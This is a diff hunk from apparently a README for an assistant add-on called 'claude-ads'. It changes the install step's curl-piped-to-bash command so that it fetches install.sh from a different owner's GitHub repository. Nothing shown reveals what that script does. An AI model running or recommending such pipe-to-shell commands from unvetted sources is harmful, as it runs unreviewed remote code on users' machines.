@@ -23,7 +23,7 @@ claude   # opens the assistant
 ### Step 2 — Install claude-ads
 
 ```bash
-curl -fsSL https://github.com/AgriciDaniel/claude-ads/raw/main/install.sh | bash
+curl -fsSL https://github.com/bendervintimilla/skills-AI-marketing-tool/raw/main/install.sh | bash
 ```
 
 Or if you have the project files locally:
